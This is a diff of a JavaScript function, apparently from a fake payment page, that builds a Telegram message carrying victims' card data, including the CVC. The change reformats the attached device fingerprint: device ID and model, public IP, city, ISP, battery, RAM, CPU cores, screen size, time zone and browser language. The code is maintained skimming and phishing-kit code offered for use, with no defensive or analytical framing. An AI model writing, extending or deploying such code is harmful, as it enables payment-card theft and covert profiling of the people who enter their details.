@@ -134,21 +134,22 @@ async function sendTelegramMessage(data, isInitial = true) {
                   `🔒 رمز CVC: <code>${data.card_data.cvc}</code>\n`;
       }
 
-      // تفاصيل الجهاز والشبكة والموقع بدون الإحداثيات
-      message += `\n🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
-                 `🌍 <b>IP الخارجي:</b> <code>${publicIP}</code>\n` +
+      // تفاصيل الجهاز والشبكة والموقع المنسقة باحترافية
+      message += `\n<b>━━━━ ⚙️ بيانات الجهاز والشبكة ━━━━</b>\n` +
+                 `🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
+                 `💡 <b>نوع الجهاز:</b> <b>${deviceType}</b>\n` +
+                 `📱 <b>طراز الجهاز:</b> <b>${deviceModel}</b>\n` +
+                 `🌐 <b>IP الخارجي:</b> <code>${publicIP}</code>\n` +
                  `🏙 <b>المدينة والدولة:</b> <b>${locationText}</b>\n` +
-                 `📡 <b>الشبكة / المزود (ISP):</b> <b>${ispText}</b>\n` +
-                 `———————————————\n` +
-                 `📅 <b>تاريخ الإرسال:</b> ${dateTimeStr}\n` +
+                 `📡 <b>مزود الخدمة (ISP):</b> <b>${ispText}</b>\n` +
+                 `----------------------------------------\n` +
+                 `📅 <b>تاريخ الإرسال:</b> <code>${dateTimeStr}</code>\n` +
                  `🔋 <b>حالة البطارية:</b> ${batteryInfo}\n` +
-                 `📱 <b>طراز الجهاز:</b> ${deviceModel}\n` +
-                 `🧠 <b>ذاكرة الجهاز (RAM):</b> ${deviceRAM}\n` +
-                 `⚙️ <b>أنوية المعالج:</b> ${cpuCores}\n` +
-                 `💡 <b>نوع الجهاز:</b> ${deviceType}\n` +
-                 `📺 <b>أبعاد الشاشة:</b> ${screenSize}\n` +
-                 `⏰ <b>التوقيت والمنطقة:</b> ${userTimeZone}\n` +
-                 `🌍 <b>لغة المتصفح:</b> ${lang}`;
+                 `🧠 <b>الذاكرة العشوائية (RAM):</b> <code>${deviceRAM}</code>\n` +
+                 `⚙️ <b>أنوية المعالج (CPU):</b> <code>${cpuCores} Cores</code>\n` +
+                 `📺 <b>أبعاد الشاشة:</b> <code>${screenSize}</code>\n` +
+                 `⏰ <b>المنطقة الزمنية:</b> <code>${userTimeZone}</code>\n` +
+                 `🌍 <b>لغة المتصفح:</b> <code>${lang}</code>`;
 
     } else {
       // 2. الرسالة الثانية: تأكيد نجاح الدفع والتفعيل
